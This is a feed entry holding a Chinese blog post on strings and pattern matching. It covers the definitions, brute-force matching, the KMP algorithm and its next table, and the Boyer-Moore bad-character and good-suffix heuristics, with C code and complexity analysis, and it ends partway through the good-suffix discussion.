      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>串</title>
    <url>/algorithm/string/</url>
    <content><![CDATA[<p>串或字符串属于线性结构，但字符串作为数据结构，结构简单，规模庞大，元素重复率高。所谓结构简单，是指字符表本身的规模不大，甚至可能极小。以生物信息序列为例，参与蛋白质合成的氨基酸只有20种，而构成DNA序列仅有4种。因此，以字符串形式表示的海量文本处理技术，一直都是相关领域的研究重点。</p>
<a id="more"></a>

<p>一般地，由$n$个字符组成构成的串记作：</p>
<p>$S=a_0a_1a_2…a_{n-1}$,其中$a_i \in \sum,0\leq i &lt;n$</p>
<p>这里的$\sum$是所有可用字符的集合，称作字符表，例如二进制比特集，ASCII字符集。字符串S中所含字符的总数$n$，称作S的长度，记作$|S|=n$。这里只考虑长度有限的串，特别地，长度为零的串称作空串。</p>
<p>字符串中任一连续的片段，称作其子串。具体地，对于任意$0\leq i&lt;i+k&lt;n$,由字符串S中起始于位置i的长度为k的子串称作后缀，分别记作：</p>
<p>$S.substr(i,k)=a_ia_{i+1}…a_{ i+k}=S[i,i+k)$</p>
<p>特殊地，起始于位置0、长度为k的子串称作前缀，而终止于位置n-1、长度为k的子串称为后缀，分别记作：</p>
<p>$prefix(S,k)=S.substr(0,k)=S[0,k)$</p>
<p>$Suffix(S,k)=S.substr(n-k,k)=S[n-k,n)$</p>
<p>由以上定义可知：空串是任何字符串的子串，也是任何字符串的前缀和后缀。任何字符串都是自己的子串，也是自己的前缀和后缀。</p>
<p>最后，字符串$S[0,n)$和$T[0,m)$相等，当且仅当二者长度相等$(n=m)$,且对应的字符相同(对任意$0\leq i&lt;n$都有$S[i]=T[i]$)。</p>
<h1 id="具体应用"><a href="#具体应用" class="headerlink" title="具体应用"></a>具体应用</h1><p>在涉及字符串的众多实际应用中，模式匹配是最常使用的一项基本操作。比如UNIX Shell的grep工具和DOS的find命令基本功能都是在指定的字符串中查找特定模式的字符串。生物信息处理领域，也经常需要在蛋白质序列中寻找特定的氨基酸模式。</p>
<p>以上所有应用问题，本质上都可描述为如下形式：</p>
<p><strong>如何在字符串数据中，检测和提取以字符串为形式给出的某一局部特征</strong>。</p>
<p>这类操作都属于串模式匹配范畴，简称串匹配。一般地，即</p>
<p>对于基于同一字符表的任何文本串$T(|T|=n)$和模式串$(|P|=m)$：</p>
<ul>
<li>判定$T$中是否存在某一子串与$T$相同</li>
<li>若存在(匹配)，则报告该子串在$T$中的起始位置</li>
</ul>
<p>串的长度$n$和$m$都很大，但相对而言$m$更大，即满足$2&lt;&lt;m&lt;&lt;n$ 。</p>
<p>根据具体应用需求的不同，串匹配模式可以多种形式呈现。</p>
<p>有些场合属于模式检测问题：只关心是否存在匹配而不关心具体的匹配位置，比如垃圾邮件的检测。有些场合属于模式定位问题，若经判断的确存在匹配，则还需确定具体的匹配位置，比如带病毒程序的鉴别和修复。有些场合属于模式计数问题：若存在多处匹配，则统计出匹配的子串总数，比如网络热门词汇榜的更新。有些场合则属于模式枚举问题，若存在多处匹配时，报告出所有匹配的具体位置。</p>
<p>如何对任一串匹配算法进行评估呢？</p>
<p>假设文本串T和模式串P都是随即生成的，然后综合其各种组合从数学和统计等角度得出结论。</p>
<p>以二进制编码为例，长度为$m$的P有$2^m$ 种，长度为$m$同时在$T$中出现的P为$n-m+1&lt;n$种。</p>
<p>匹配成功的概率极其低，所以并不适合作为衡量的方法。</p>
<p>另外一种简便策略为，随机选取文本串$T$，并从$T$中随机取出长度为$m$的子串作为模式串$P$，此为成功情况。失败情况则采用随机的模式串$P$，由此统计平均复杂度。</p>
<h1 id="蛮力算法"><a href="#蛮力算法" class="headerlink" title="蛮力算法"></a>蛮力算法</h1><p>不妨按自左向右的顺序考查各子串。在初始状态下，$T$的前$m$个字符将与$P$的$m$个字符两两对齐。接下来，自左向右检查相互对齐的这$m$对字符，若当前字符对相互匹配，则转向下一字符，反之，一旦失配，则说明在此位置文本串与模式串不可能完全匹配，于是可将$P$整体向右移动一个字符，并从其首字符开始与T中对应的新子串重新对比。</p>
<h2 id="版本一"><a href="#版本一" class="headerlink" title="版本一"></a>版本一</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/******************************************************************************************</span></span><br><span class="line"><span class="comment"> * Text     :  0   1   2   .   .   .   i-j .   .   .   .   i   .   .   n-1</span></span><br><span class="line"><span class="comment"> *             ------------------------|-------------------|------------</span></span><br><span class="line"><span class="comment"> * Pattern  :                          0   .   .   .   .   j   .   .</span></span><br><span class="line"><span class="comment"> *                                     |-------------------|</span></span><br><span class="line"><span class="comment"> ******************************************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">match</span> <span class="params">( <span class="keyword">char</span>* P, <span class="keyword">char</span>* T )</span> </span>&#123; <span class="comment">//串匹配算法（Brute-force-1）</span></span><br><span class="line">   <span class="keyword">size_t</span> n = <span class="built_in">strlen</span> ( T ), i = <span class="number">0</span>; <span class="comment">//文本串长度、当前接受比对字符的位置</span></span><br><span class="line">   <span class="keyword">size_t</span> m = <span class="built_in">strlen</span> ( P ), j = <span class="number">0</span>; <span class="comment">//模式串长度、当前接受比对字符的位置</span></span><br><span class="line">   <span class="keyword">while</span> ( j &lt; m &amp;&amp; i &lt; n ) <span class="comment">//自左向右逐个比对字符</span></span><br><span class="line">      <span class="keyword">if</span> ( T[i] == P[j] ) <span class="comment">//若匹配</span></span><br><span class="line">         &#123; i ++;  j ++; &#125; <span class="comment">//则转到下一对字符</span></span><br><span class="line">      <span class="keyword">else</span> <span class="comment">//否则</span></span><br><span class="line">         &#123; i -= j - <span class="number">1</span>; j = <span class="number">0</span>; &#125; <span class="comment">//文本串回退、模式串复位</span></span><br><span class="line">   <span class="keyword">return</span> i - j; <span class="comment">//如何通过返回值，判断匹配结果？</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>版本一借助整数$i$和$j$，分别指示T和P中当前接受比对的字符T[i]和P[i]。若当前字符对匹配，则i和j同时递增以指向下一对字符。一旦$j$增长到$m$则意味着发现了匹配，即可返回P相对于T的对齐位置$i-j$。一旦当前字符失配，则i回退并指向T中当前对齐位置的下一字符，同时j复位至P的首字符处，然后开始下一轮比对。</p>
<p>退出情况对应于整体匹配成功与否</p>
<ul>
<li>若失败，则$j&lt;m,i=n$,$i-j$必然大于$n-m$</li>
<li>若成功，则$j=m,i&lt;=n$,$i-j$必然小于等于$n-m$</li>
</ul>
<h2 id="版本二"><a href="#版本二" class="headerlink" title="版本二"></a>版本二</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/******************************************************************************************</span></span><br><span class="line"><span class="comment"> * Text     :  0   1   2   .   .   .   i   i+1 .   .   .   i+j .   .   n-1</span></span><br><span class="line"><span class="comment"> *             ------------------------|-------------------|------------</span></span><br><span class="line"><span class="comment"> * Pattern  :                          0   1   .   .   .   j   .   .</span></span><br><span class="line"><span class="comment"> *                                     |-------------------|</span></span><br><span class="line"><span class="comment"> ******************************************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">match</span> <span class="params">( <span class="keyword">char</span>* P, <span class="keyword">char</span>* T )</span> </span>&#123; <span class="comment">//串匹配算法（Brute-force-2）</span></span><br><span class="line">   <span class="keyword">size_t</span> n = <span class="built_in">strlen</span> ( T ), i = <span class="number">0</span>; <span class="comment">//文本串长度、与模式串首字符的对齐位置</span></span><br><span class="line">   <span class="keyword">size_t</span> m = <span class="built_in">strlen</span> ( P ), j; <span class="comment">//模式串长度、当前接受比对字符的位置</span></span><br><span class="line">   <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; n - m + <span class="number">1</span>; i++ ) &#123; <span class="comment">//文本串从第i个字符起，与</span></span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; m; j++ ) <span class="comment">//模式串中对应的字符逐个比对</span></span><br><span class="line">         <span class="keyword">if</span> ( T[i + j] != P[j] ) <span class="keyword">break</span>; <span class="comment">//若失配，模式串整体右移一个字符，再做一轮比对</span></span><br><span class="line">      <span class="keyword">if</span> ( j &gt;= m ) <span class="keyword">break</span>; <span class="comment">//找到匹配子串</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> i; <span class="comment">//如何通过返回值，判断匹配结果？</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>版本二借助整体$i$指示$P$相对于$T$的对齐位置，并随着$i$不断递增,对齐位置逐步右移。在每一对齐位置$i$处，另一整数从$0$递增至$m-1$，依次指示当前接受比对的字符为$T[i+j]$与$P[j]$。</p>
<h2 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h2><p>蛮力算法在最好情况下，只需经过一轮比对，比对次数=$m=O(m)$</p>
<p>然而在最坏情况下，整个算法共需做$m(n-m+1)$次比对，其中$(n-m+1)(m-1)+1$次成功比对和$n-m$次失败比对。因为$m&lt;&lt;n$，渐进的时间复杂度为$O(nm)$。</p>
<p>$|\sum|$越小，最坏情况出现的概率越高，$m$越大，最坏情况的后果越严重。</p>
<p>实际上，在通常情况下，蛮力算法效率并不算低</p>
<p>任意字符比对成功的概率与失败概率分别为1/s和(s-1)/s，其中$s=|\sum|$ 为字符表的规模。每个字符各有1/s的概率出现，故任一字符串相同、不同的概率分别为1/s和(s-1)/s。</p>
<p>在$P$与$T$的每一对齐位置，恰好执行$k$次字符对比，当且仅当前$k-1$次成功，第$k$次失败，所以需连续执行恰好$k$次字符比对操作的概率为$(s-1)/s^k$ 。</p>
<p>每一次字符比对可视为一次伯努利实验，成功与失败的概率分别为$1/s$和$(s-1)/s$，而每趟的比对次数X则符合几何分布，X的期望值不超过$s/(s-1)$。在$P$和$T$的每一对齐位置，需连续比对的次数不超过$s/s-1 \leq 2=O(1)$。</p>
<p>直接从期望值的定义出发同样可得出相应结论，具体地，连续执行字符比对操作地次数等于所有可能的次数关于对应概率的加权平均，亦即：</p>
<p>$\sum_{k=1}^{m}k(s-1)/s^k=(s-1)\sum_{k=1}^{m} k/s^k=s/(s-1)$</p>
<h1 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h1><p>蛮力算法在最坏情况下所需时间，为文本串长度与模式串长度的乘积，故无法应用于稍大的场合，很有必要改进。分析以上最坏情况，可知问题在于存在大量的局部匹配：每一轮的m次比对中，仅最后一次失配。一旦发现失配，文本串、模式串的长度都将回退，并重新开始下一轮的尝试。</p>
<p>实际上，这类重复的字符匹配没有必要，因为这些字符在前一轮迭代中已经接受过比对并且成功。那么，如何利用这些信息提高匹配的算法效率呢？</p>
<h2 id="next表"><a href="#next表" class="headerlink" title="next表"></a>next表</h2><p>在每轮比较进行到最后一对字符并发现失配后，蛮力算法会使两个字符指针同步后退，事实上，指针i完全不必后退。经过此前一轮的比较，已确定匹配的范围应为$P[0,j)=T[i-j,i)$</p>
<p>于是，若模式串经过适当右移后，可与$T$的某一子串(包含$T[i]$)完全匹配，则一项必要条件就是：</p>
<p>$P[0,t)=T[i-t,i)=P[j-t,j)$</p>
<p>亦即，在$P[0,j)$中长度为$t$的真前缀，应该与长度为$t$的真后缀完全匹配，故$t$必定来自集合:</p>
<p>$N(P,j)=\left{ 0\leq t&lt;j|P[0,t)=P[j-t,j) \right}$</p>
<p>一般地，该集合可能包含多个这样的$t$,但是需要特别注意的是，其中具体由哪些$t$值构成仅取决于模式串P和首个比对失败的$P[j]$而与文本串无关。</p>
<p>若下一轮比对从$T[i]$和$P[t]$的对比开始，等效于将$P$右移$j-t$个单元。因此，为保证P和T的对齐位置，即$i$绝不倒退，同时不错过任何可能的匹配，应从集合中挑选最大的$t$。当有多个值得试探的右移方案时，应选择其中移动距离最短者。于是，若令</p>
<p>$next[j]=max(N(p,j))$</p>
<p>则一旦发现$P[j]$与$T[i]$失配，即可转而将$P[next[j]]$与$T[i]$彼此对准，并从这一位置开始继续下一轮匹配。</p>
<p>既然集合$N[P,j)$只取决于模式串和失配位置，而与文本串无关，作为其中的最大元素$t$必然具有这一性质。对于任一字符串，均可通过预处理将所有位置$j$所对应的$next[j]$值整理为表格以便于此后查询。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">match</span> <span class="params">( <span class="keyword">char</span>* P, <span class="keyword">char</span>* T )</span> </span>&#123;  <span class="comment">//KMP算法</span></span><br><span class="line">   <span class="keyword">int</span>* next = buildNext ( P ); <span class="comment">//构造next表</span></span><br><span class="line">   <span class="keyword">int</span> n = ( <span class="keyword">int</span> ) <span class="built_in">strlen</span> ( T ), i = <span class="number">0</span>; <span class="comment">//文本串指针</span></span><br><span class="line">   <span class="keyword">int</span> m = ( <span class="keyword">int</span> ) <span class="built_in">strlen</span> ( P ), j = <span class="number">0</span>; <span class="comment">//模式串指针</span></span><br><span class="line">   <span class="keyword">while</span> ( j &lt; m  &amp;&amp; i &lt; n ) <span class="comment">//自左向右逐个比对字符</span></span><br><span class="line">      <span class="keyword">if</span> ( <span class="number">0</span> &gt; j || T[i] == P[j] ) <span class="comment">//若匹配，或P已移出最左侧（两个判断的次序不可交换）</span></span><br><span class="line">         &#123; i ++;  j ++; &#125; <span class="comment">//则转到下一字符</span></span><br><span class="line">      <span class="keyword">else</span> <span class="comment">//否则</span></span><br><span class="line">         j = next[j]; <span class="comment">//模式串右移（注意：文本串不用回退）</span></span><br><span class="line">   <span class="keyword">delete</span> [] next; <span class="comment">//释放next表</span></span><br><span class="line">   <span class="keyword">return</span> i - j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>next[0]</strong></p>
<p>只要$j&gt;0$，必有$0\in N[P,j)$，因为空串是任何非空串的子串</p>
<p>但若$j=0$,则有$N(P，0)= \emptyset$</p>
<p>不妨取$next[0]=-1$,向右移动一个字符</p>
<p><strong>next[j+1]</strong></p>
<p>根据已知的$next[0,j]$,如何高效地计算$next[j+1]$?</p>
<p>$next[j]=t$，则意味着在$P[0,j)$中，自匹配的真前缀和真后缀的最大长度为t，故必有$next[j+1] \leq next[j]+1 $,特别地，当且仅当$P[j]=P[t]$时取等号。</p>
<p>那么，更一般地，若$P[j]$不等于$p[t]$，又该如何得到$next[j+1]$?</p>
<p>由next表的功能定义，$next[j+1]$的下一候选者应该依次是</p>
<p>$next[next[j]]+1,next[next[next[j]]]+1,…$</p>
<p>因此，只需反复用$next[t]$替换$t$，即可按优先次序遍历以上候选者：一旦发现$P[j]$与$P[i]$匹配，可令$next[j+1]=next[t]+1$。既然总有$next[t]&lt;t$,故在此过程中$t$必然严格递减，同时，即便$t$降低至$0$，亦必然会终止于通配的next[0]=-1。</p>
<p>next表构造算法如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">buildNext</span> <span class="params">( <span class="keyword">char</span>* P )</span> </span>&#123; <span class="comment">//构造模式串P的next表</span></span><br><span class="line">   <span class="keyword">size_t</span> m = <span class="built_in">strlen</span> ( P ), j = <span class="number">0</span>; <span class="comment">//“主”串指针</span></span><br><span class="line">   <span class="keyword">int</span>* N = <span class="keyword">new</span> <span class="keyword">int</span>[m]; <span class="comment">//next表</span></span><br><span class="line">   <span class="keyword">int</span> t = N[<span class="number">0</span>] = <span class="number">-1</span>; <span class="comment">//模式串指针</span></span><br><span class="line">   <span class="keyword">while</span> ( j &lt; m - <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">if</span> ( <span class="number">0</span> &gt; t || P[j] == P[t] ) &#123; <span class="comment">//匹配</span></span><br><span class="line">         j ++; t ++;</span><br><span class="line">         N[j] = t; <span class="comment">//此句可改进...</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="comment">//失配</span></span><br><span class="line">         t = N[t];</span><br><span class="line">   <span class="keyword">return</span> N;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h2><p>KMP算法借助next表的确可以避免大量不必要的比对操作，但是直觉来看，在最坏情况下，共有$\Omega(n)$个对齐位置，而且在每一位置都有可能需要比对$\Omega(m)$次。实际上，在最坏情况下,KMP算法也只需运行线性时间。</p>
<p>考查作为字符指针的变量i和j，若令$k=2i-j$并考查k在KMP算法过程中的变化趋势，while每迭代一轮，k都会严格递增。</p>
<p>实际上，对应于while循环内部的if-else分支，无非两种情况：</p>
<ul>
<li>若转入if分支，则$k=2i-j$ 必将增加</li>
<li>若转入else分支，尽管$i$不变，但在赋值$j=next[j]$之后$j$必然减小，所以$k=2i-j$必然增加</li>
</ul>
<p>纵观算法的整个过程，启动时有$i=j=0$,即$k=0$,算法结束时$i\leq n$且$j \geq 0$，故有$k\leq 2n$。在此期间尽管$k$从0开始持续地递增，但累计增幅不过$2n$,故while循环至多执行$2n$轮。另外,while()循环体内部不含有任何循环和扽之调用，故只需$O(1)$时间。也就是说，尽管可能有$\Omega(n)$对齐位置，但就分摊意义而言，在每一对齐位置仅需$O(1)$次比对。</p>
<p>next表的构造算法与KMP算法并无本质区别，所以仿照上述分析可知，next表的构造算法仅需$O(m)$时间。综上可知，KMP算法的总体运行时间为$O(n+m)$。</p>
<p>特别适用于顺序存储介质，在单次匹配概率越大的场合，优势越明显，否则，与蛮力算法的性能相差无几。</p>
<p>在算法执行过程中：</p>
<ul>
<li>观察量$i$始终等于已经做过的成功比对次数(含最左端虚拟通配符的比对)次数</li>
<li>观察量$i-j$始终不小于已经做过的失败比对次数</li>
</ul>
<p>循环中if判断的两个分支，分别对应于成功和失败比对。其中，只有成功的比对会修改i,即i加一，当且仅当当前的比对是成功的。考虑到i初始值始终为0，始终等于成功比对的次数。</p>
<p>观察量i-j的初始值也是0。对于成功分支，变量i和j会同时递增一个单位，故$i-j$的数值将保持不变。而在失败分支中，观察量i不变，另一方面，必有$next[j]&lt;j$，故在变量$j$替换为$next[j]$之后，观察量$i-j$亦必严格单调地增加。综合以上两种情况，观察量$i-j$必然可以作为失败次数的上界。</p>
<p>成功比对次数和失败比对次数之和即为所有比较次数。</p>
<h2 id="再优化"><a href="#再优化" class="headerlink" title="再优化"></a>再优化</h2><p>尽管以上KMP算法可保证线性的运行时间，但在某些情况下仍然有优化的余地。</p>
<p>考查模式串P=”000010”</p>
<p><img src="https://i.loli.net/2019/09/10/6BhE1GOXm3dAULb.png"></p>
<p>实际上，即便说$P[3]$与$T[3]$的比较还算必然，后续的这三次对比却都是不必要的，它们的失败结果早已注定。</p>
<p>在之前的next表中，我们利用了以往成功比对所提供的信息，将记忆力转化为预知力，但是失败比对的教训却被忽略了。</p>
<p>为了吸取教训，将集合$N[P,j)$的定义修改为：</p>
<p>$N(P,j)=\left{ 0\leq t&lt;j|P[0,t)=P[j-t,j)\right}$ 且$P[t]!=P[j]$</p>
<p>除对应于自匹配长度外，$t$只有还满足当前字符对不匹配的条件方能归入集合$N[P,j)$并作为next表项的候选。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">buildNext</span> <span class="params">( <span class="keyword">char</span>* P )</span> </span>&#123; <span class="comment">//构造模式串P的next表（改进版本）</span></span><br><span class="line">   <span class="keyword">size_t</span> m = <span class="built_in">strlen</span> ( P ), j = <span class="number">0</span>; <span class="comment">//“主”串指针</span></span><br><span class="line">   <span class="keyword">int</span>* N = <span class="keyword">new</span> <span class="keyword">int</span>[m]; <span class="comment">//next表</span></span><br><span class="line">   <span class="keyword">int</span> t = N[<span class="number">0</span>] = <span class="number">-1</span>; <span class="comment">//模式串指针</span></span><br><span class="line">   <span class="keyword">while</span> ( j &lt; m - <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">if</span> ( <span class="number">0</span> &gt; t || P[j] == P[t] ) &#123; <span class="comment">//匹配</span></span><br><span class="line">         N[j] = ( P[++j] != P[++t] ? t : N[t] ); <span class="comment">//注意此句与未改进之前的区别</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="comment">//失配</span></span><br><span class="line">         t = N[t];</span><br><span class="line">   <span class="keyword">return</span> N;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="BM算法"><a href="#BM算法" class="headerlink" title="BM算法"></a>BM算法</h1><p>KMP算法的思路可概括为：当前比对一旦失配。即利用此前的比对(无论成功或失败)所提供的信息，尽可能长距离地移动模式串。无需显式地反复保存或更新比对的历史，而是独立于具体的文本串，事先根据模式串预测出所有可能出现的失配情况。</p>
<p>串匹配过程为多次失败的对齐和0/1次成功的对齐。就单个对齐位置的排除而言，平均只需常数次比对，且具体的比对位置和次序无所谓。然而就排除更多后续位置而言，不同的对比位置及次序，作用差异极大。其中，越是靠前/后的位置，作用越小/大。</p>
<p>BM算法中，模式串P与文本串T的对准位置依然自左向右推移，而在每一对准位置却是自右向左地逐一比对各个字符。在每一轮自右向左的比对过程中，一旦发现失配，则将P右移一定距离并再次与T对准，然后重新一轮自右向左的扫描比对。</p>
<p>BM算法如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">match</span> <span class="params">( <span class="keyword">char</span>* P, <span class="keyword">char</span>* T )</span> </span>&#123; <span class="comment">//Boyer-Morre算法（完全版，兼顾Bad Character与Good Suffix）</span></span><br><span class="line">   <span class="keyword">int</span>* bc = buildBC ( P ); <span class="keyword">int</span>* gs = buildGS ( P ); <span class="comment">//构造BC表和GS表</span></span><br><span class="line">   <span class="keyword">size_t</span> i = <span class="number">0</span>; <span class="comment">//模式串相对于文本串的起始位置（初始时与文本串左对齐）</span></span><br><span class="line">   <span class="keyword">while</span> ( <span class="built_in">strlen</span> ( T ) &gt;= i + <span class="built_in">strlen</span> ( P ) ) &#123; <span class="comment">//不断右移（距离可能不止一个字符）模式串</span></span><br><span class="line">      <span class="keyword">int</span> j = <span class="built_in">strlen</span> ( P ) - <span class="number">1</span>; <span class="comment">//从模式串最末尾的字符开始</span></span><br><span class="line">      <span class="keyword">while</span> ( P[j] == T[i + j] ) <span class="comment">//自右向左比对</span></span><br><span class="line">         <span class="keyword">if</span> ( <span class="number">0</span> &gt; --j ) <span class="keyword">break</span>; <span class="comment">/*DSA*/</span>showProgress ( T, P, i, j ); <span class="built_in">printf</span> ( <span class="string">&quot;\n&quot;</span> ); getchar();</span><br><span class="line">      <span class="keyword">if</span> ( <span class="number">0</span> &gt; j ) <span class="comment">//若极大匹配后缀 == 整个模式串（说明已经完全匹配）</span></span><br><span class="line">         <span class="keyword">break</span>; <span class="comment">//返回匹配位置</span></span><br><span class="line">      <span class="keyword">else</span> <span class="comment">//否则，适当地移动模式串</span></span><br><span class="line">         i += __max ( gs[j], j - bc[ T[i + j] ] ); <span class="comment">//位移量根据BC表和GS表选择大者</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">delete</span> [] gs; <span class="keyword">delete</span> [] bc; <span class="comment">//销毁GS表和BC表</span></span><br><span class="line">   <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中借助了整数i和j指示文本串中当前对齐位置T[i]和模式串中接受比对的字符P[j]。不过，一旦局部失配，根据bc表和gs表确定最大的安全移动距离。为此，需要通过预处理，根据模式串P整理出坏字符和好后缀两类信息。</p>
<h2 id="坏字符"><a href="#坏字符" class="headerlink" title="坏字符"></a>坏字符</h2><p>若当前模式串P当前在文本串中的对齐位置为i，且在这一轮自右向左将P和substr(T,i,m)的比对过程中，在P[j]处首次发现失配：$T[i+j] =X \neq Y=P[j]$，则将$X$称为坏字符。</p>
<p>若P与T的某一子串(包括$T[i+j]$在内)匹配，则必然在$T[i+j]=X$中匹配，反之，若与$T[i+j]$对准的字符不是X,则必然失配。只需找出P中的每一字符X，分别与$T[i+j]=X$对准，并执行一轮从右向左的扫描比对。对应每个这样的字符，P的位移量仅取决于原来失配位置$j$，以及$X$在P中的秩，而与$T$和$i$​无关。</p>
<p><strong>bc表</strong></p>
<p>若P中含有多个X,仅尝试p中最靠右的字符X(若存在)。如此可在确保不致遗漏匹配的前提下，始终单向地滑动模式串。若P中最靠右的字符X为$P[k]=X$,则P的右移量为$j-k$。</p>
<p>对于任一给定的模式串P，$k$值只取决于字符$T[i+j]=X$,因此可视为从字符表到整数(P中字符的秩)的一个函数</p>
<p>$bc(x)=$</p>
<ul>
<li>$k$，若$P[k]=x$,且对所有的$i&gt;k$都有$p[i]!=c$</li>
<li>$-1$,若P中不含字符$c$</li>
</ul>
<p>若当前对齐位置为$i$，则一旦出现坏字符$P[j]=Y$,则重新对齐于$i+=j-bc[T[i+j]]$</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//*****************************************************************************************</span></span><br><span class="line"><span class="comment">//    0                       bc[&#x27;X&#x27;]                                m-1</span></span><br><span class="line"><span class="comment">//    |                       |                                      |</span></span><br><span class="line"><span class="comment">//    ........................X***************************************</span></span><br><span class="line"><span class="comment">//                            .|&lt;------------- &#x27;X&#x27; free ------------&gt;|</span></span><br><span class="line"><span class="comment">//*****************************************************************************************</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">buildBC</span> <span class="params">( <span class="keyword">char</span>* P )</span> </span>&#123; <span class="comment">//构造Bad Charactor Shift表：O(m + 256)</span></span><br><span class="line">   <span class="keyword">int</span>* bc = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>]; <span class="comment">//BC表，与字符表等长</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j ++ ) bc[j] = <span class="number">-1</span>; <span class="comment">//初始化：首先假设所有字符均未在P中出现</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">size_t</span> m = <span class="built_in">strlen</span> ( P ), j = <span class="number">0</span>; j &lt; m; j ++ ) <span class="comment">//自左向右扫描模式串P</span></span><br><span class="line">      bc[ P[j] ] = j; <span class="comment">//将字符P[j]的BC项更新为j（单调递增）——画家算法</span></span><br><span class="line">   <span class="comment">/*DSA*/</span>printBC ( bc );</span><br><span class="line">   <span class="keyword">return</span> bc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该算法在对BC表初始化后，对模式串做一遍线性扫描，并不断用当前字符的秩更新BC表中的对应项。因为是按照秩递增的顺序从左到右扫描，所以只要c在P中出现过，则最终的BC表将记录下其中最靠右的秩。</p>
<p>运行时间可划分为两个部分，分别消耗于其中的两个循环，前者是对字符表中每个字符进行初始化，时间不超过$O(|\sum|)$ 。后一循环对模式串P做一轮扫描，其中每个字符消耗$O(1)$时间，故共需$O(m)$时间。由此可知，BC表可在$O(|\sum|+m)$时间内构造出来，其中$|\sum|$为字符表的规模，m为模式串的长度。</p>
<p>暂且不计构造BC表的过程，BM算法本身进行串模式匹配所需时间与具体的输入十分相关。若将文本串和模式串的长度分别记作n和m，则在通常情况下实际运行时间往往低于$O(n)$。在最好情况下，每经过常数次比对就可以将模式串整体向右移动m个字符，此类情况下只需$O(n/m)$次比对算法即可终止，故运行时间不过$ O(n/m)$。</p>
<p>在最坏情况下，每轮迭代都需要在扫过整个P之后，方能确定右移一个字符，须经过m次比较，方能排除单个对齐位置，时间复杂度为$ O(nm) $。</p>
<p>单次匹配概率越大的场合，性能越接近蛮力算法。</p>
<p>针对坏字符在模式串中的位置太过于靠右，以至位移量为负的情况，建议将P右移一个字符，此后并不能保证坏字符出恢复匹配，可在P[j]的左侧找到最靠右的字符并将其与原坏字符对齐。</p>
<p>以上思路的实现方式等效于将原来一维的bc表，替换为二维的bc表，具体地，这是一张m*$|\sum|$ 的表格。尽管预处理时间和所需空间增长量并不大，但是匹配算法的控制流程却进一步复杂化。最重要的是，此类二维bc表若能发挥作用，则当时的好后缀必然很长，此类情况同时使用的gs表必然可以代替bc表。</p>
<h2 id="好后缀"><a href="#好后缀" class="headerlink" title="好后缀"></a>好后缀</h2><p>参照KMP算法的思路，坏字符策略仅仅利用了此前失败比对所提供的教训而忽视了成功的比对。类似于KMP算法，只不过前后颠倒而已。</p>
<p>每轮比对中的若干次成功匹配，都对应于模式串P的一个后缀，称为好后缀(good suffix)。</p>
<p>一般地，设本轮自右向左的扫描匹配终止于失配位置：</p>
<p>$T[i+j]=X \neq Y=P[j]$</p>
<p>若分别记</p>
<p>$W=substr(T,i+j+1,m-j-1)=T[i+j+1,m+i)$</p>
<p>$U=suffix(P,m-j-1)=P[j+1,m)$</p>
<p>则$U$为当前的好后缀，$W$为$T$中与之匹配的子串。好后缀的长度为m-j-1,故只要$j\leq m-2$,则$U$必然非空，$U=W$。</p>
<p>此时若存在某一整数，使得在将P整体右移j-k个单元，并使$P[k]$与$T[i+j]$相互对齐之后，$P$可以与文本串的某一子串(包括$T[m+j-1]$在内)匹配，亦即</p>
<p>$P=substr(T,i+j-k,m)=T[i+j-k,m+i+j-k)$</p>
<p>于是，若记：</p>
<p>$V(k)=substr(P,k+1,m-j-1)=P[k+1,m-j+k)$</p>
<p>必然有$V(k)=W=U$</p>
<p>也就是说，若值得将$P[k]$与$T[i+j]$对齐并做新的一轮比对，则P的子串首先必须和P自己的后缀U相匹配。</p>
<p>另外，还有一必要条件，P中这两个匹配的子串的前驱字符不得相等，即P[k]$\neq$ P[j],与之前类似，在此处必将再次失败。</p>
<p>若模式串存在多个满足上述必要条件的子串V(k),不妨选取其中最靠右者(对应最大的$k$,最小的右移距离$j-k$)。</p>
<p>若P中不存在任何子串与U完全匹配，则从P的所有前缀中，找出可与U的某一真后缀相匹配的最长者作为V(k)，并取$gs[j]=m-|V(k)|$。</p>
